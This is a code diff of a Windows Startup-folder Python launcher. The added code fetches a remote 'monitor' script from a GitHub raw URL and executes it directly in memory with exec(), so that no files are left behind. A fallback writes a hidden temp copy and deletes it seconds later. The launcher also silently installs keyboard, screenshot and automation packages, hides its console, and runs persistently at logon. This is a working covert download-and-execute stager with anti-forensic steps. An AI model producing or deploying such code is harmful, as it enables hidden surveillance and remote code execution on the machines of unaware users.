@@ -1,4 +1,4 @@
-# github_launcher.pyw - Clean launcher that runs from GitHub
+# github_launcher.pyw - Runs monitor script WITHOUT creating any files
 import os
 import sys
 import subprocess
@@ -6,36 +6,24 @@ import urllib.request
 import tempfile
 import time
 
-def run_monitor():
-    """Download and run monitor script from GitHub"""
+def run_from_memory():
+    """Download and execute script directly from memory - NO files created"""
     try:
         # GitHub URL
         SCRIPT_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/monitor_script.py"
         
-        # Create temp folder for this session
-        session_id = str(int(time.time()))
-        temp_dir = os.path.join(tempfile.gettempdir(), f"monitor_{session_id}")
-        os.makedirs(temp_dir, exist_ok=True)
-        
-        temp_script = os.path.join(temp_dir, "monitor.py")
-        
-        # Download the script
-        response = urllib.request.urlopen(SCRIPT_URL, timeout=10)
+        # Download script directly
+        response = urllib.request.urlopen(SCRIPT_URL)
         script_code = response.read().decode('utf-8')
         
-        # Save to temp folder
-        with open(temp_script, 'w', encoding='utf-8') as f:
-            f.write(script_code)
-        
-        # Add auto-install at beginning
-        with open(temp_script, 'r+') as f:
-            content = f.read()
-            f.seek(0, 0)
-            
-            auto_install = '''# Auto-install dependencies
+        # Check if we need to add auto-install
+        if "import pywin32" in script_code and "def is_package_installed" not in script_code:
+            # Add auto-install code at the beginning
+            auto_install = '''
+# Auto-install missing dependencies
 import sys, subprocess, importlib.util
 
-def install(pkg):
+def install_package(pkg):
     try:
         subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"],
                       creationflags=subprocess.CREATE_NO_WINDOW)
@@ -46,76 +34,116 @@ def install(pkg):
 required = ["pywin32", "pyautogui", "keyboard", "requests", "pillow"]
 for pkg in required:
     try:
+        if pkg == "pillow":
+            __import__("PIL")
+        else:
+            __import__(pkg)
+    except ImportError:
+        install_package(pkg)
+'''
+            script_code = auto_install + script_code
+        
+        # Execute directly from memory
+        exec(script_code)
+        
+        return True
+        
+    except Exception:
+        return False
+
+def run_from_temp():
+    """Alternative: Run from temp file that gets deleted immediately"""
+    try:
+        # GitHub URL
+        SCRIPT_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/monitor_script.py"
+        
+        # Download script
+        response = urllib.request.urlopen(SCRIPT_URL)
+        script_code = response.read().decode('utf-8')
+        
+        # Create temp file (will be deleted)
+        temp_dir = tempfile.gettempdir()
+        script_path = os.path.join(temp_dir, "monitor_temp.py")
+        
+        # Add auto-install
+        if "def is_package_installed" not in script_code:
+            auto_install = '''
+import sys, subprocess, importlib.util
+
+def install(pkg):
+    try:
+        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"],
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        return True
+    except:
+        return False
+
+for pkg in ["pywin32", "pyautogui", "keyboard", "requests", "pillow"]:
+    try:
         __import__(pkg if pkg != "pillow" else "PIL")
     except ImportError:
         install(pkg)
-
 '''
-            f.write(auto_install + content)
+            script_code = auto_install + script_code
         
-        # Run the script (completely hidden)
+        # Write to temp file
+        with open(script_path, 'w', encoding='utf-8') as f:
+            f.write(script_code)
+        
+        # Run completely hidden
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         
         process = subprocess.Popen(
-            [sys.executable, temp_script],
+            [sys.executable, script_path],
             startupinfo=startupinfo,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-            cwd=temp_dir
+            creationflags=subprocess.CREATE_NO_WINDOW
         )
         
-        # Schedule cleanup after 10 seconds
-        time.sleep(10)
-        try:
-            # Try to delete temp folder
-            import shutil
-            shutil.rmtree(temp_dir, ignore_errors=True)
-        except:
-            pass
+        # Schedule deletion of temp file
+        def delete_temp():
+            time.sleep(5)
+            try:
+                os.remove(script_path)
+            except:
+                pass
+        
+        import threading
+        threading.Thread(target=delete_temp, daemon=True).start()
         
         return True
         
-    except Exception as e:
-        # Silent failure - no output
+    except Exception:
         return False
 
-def keep_startup_clean():
-    """Ensure startup folder only contains launcher files"""
+def ensure_no_files_in_startup():
+    """Make sure startup folder doesn't have unwanted files"""
     try:
         startup_folder = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         )
         
-        # Files that should remain
-        allowed_files = {'Startup.pyw', 'github_launcher.pyw'}
+        # Check what's there but don't delete anything
+        # (The monitor script will handle deletion)
+        files = os.listdir(startup_folder)
         
-        for filename in os.listdir(startup_folder):
-            filepath = os.path.join(startup_folder, filename)
+        # Count unwanted files
+        unwanted = 0
+        for f in files:
+            if f.endswith(('.log', '.txt', '.json', '.py', '.pyc')) and f not in ['Startup.pyw', 'github_launcher.pyw']:
+                unwanted += 1
+        
+        if unwanted > 0:
+            # The monitor script will clean these up
+            pass
             
-            # Delete any .py/.log files that aren't launchers
-            if filename.endswith(('.py', '.pyw', '.log', '.txt', '.json')):
-                if filename not in allowed_files:
-                    try:
-                        os.remove(filepath)
-                    except:
-                        pass
-        
-        # Delete __pycache__ folders
-        for root, dirs, files in os.walk(startup_folder, topdown=False):
-            for dir_name in dirs:
-                if dir_name == '__pycache__':
-                    try:
-                        import shutil
-                        shutil.rmtree(os.path.join(root, dir_name), ignore_errors=True)
-                    except:
-                        pass
     except:
         pass
 
 def main():
-    """Main launcher function"""
-    # Hide console (if running as .pyw)
+    """Main launcher - completely clean, no file creation"""
+    # Hide console if possible
     try:
         import win32gui
         import win32con
@@ -124,18 +152,20 @@ def main():
     except:
         pass
     
-    # Ensure startup folder is clean
-    keep_startup_clean()
+    # Check startup folder (just for info)
+    ensure_no_files_in_startup()
     
-    # Initial delay for network
+    # Wait for network
     time.sleep(5)
     
-    # Run monitor from GitHub
-    run_monitor()
+    # Try to run from memory first (cleanest)
+    if not run_from_memory():
+        # Fallback to temp file method
+        run_from_temp()
     
     # Keep launcher alive but idle
     while True:
-        time.sleep(3600)  # Check every hour
+        time.sleep(3600)
 
 if __name__ == "__main__":
     main()
